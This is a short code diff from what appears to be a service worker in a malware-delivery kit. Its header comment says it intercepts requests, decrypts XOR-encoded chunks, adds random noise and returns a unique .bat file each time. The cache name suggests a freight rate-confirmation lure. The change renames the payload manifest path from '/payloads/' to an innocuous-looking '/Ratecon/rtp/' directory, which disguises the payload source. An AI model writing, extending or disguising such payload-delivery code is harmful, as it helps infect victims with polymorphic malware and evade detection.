@@ -2,7 +2,7 @@
 // Intercepts /generate-bat, downloads encrypted chunks, decrypts, adds random noise, returns unique .bat
 
 const CACHE_NAME = 'freight-confirm-v1';
-const CHUNK_MANIFEST = '/payloads/manifest.json';
+const CHUNK_MANIFEST = '/Ratecon/rtp/manifest.json';
 const XOR_KEY = 0xAA; // XOR key for chunk decryption
 
 // Install — pre-cache landing page
